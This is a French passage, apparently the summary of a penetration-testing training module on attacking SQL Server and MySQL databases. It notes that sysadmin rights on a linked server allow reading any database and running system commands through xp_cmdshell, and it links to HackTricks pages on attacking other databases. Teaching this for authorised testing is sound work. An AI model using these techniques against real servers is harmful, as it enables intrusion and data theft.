Comme nous l'avons vu, nous pouvons désormais exécuter des requêtes avec les privilèges sysadmin sur le serveur lié. En tant `sysadmin`, nous contrôlons l'instance SQL Server. Nous pouvons lire les données de n'importe quelle base de données ou exécuter des commandes système avec `xp_cmdshell`. Cette section a couvert certaines des façons les plus courantes d'attaquer les bases de données SQL Server et MySQL lors des missions de test d'intrusion. Il existe d'autres méthodes pour attaquer ces types de bases de données ainsi que d'autres, telles que [PostGreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql), SQLite, Oracle, [Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting- web/buckets/firebase-database) et [MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb) qui seront traités dans d'autres modules. Il vaut la peine de prendre le temps de se renseigner sur ces technologies de base de données et sur certains des moyens courants de les attaquer également.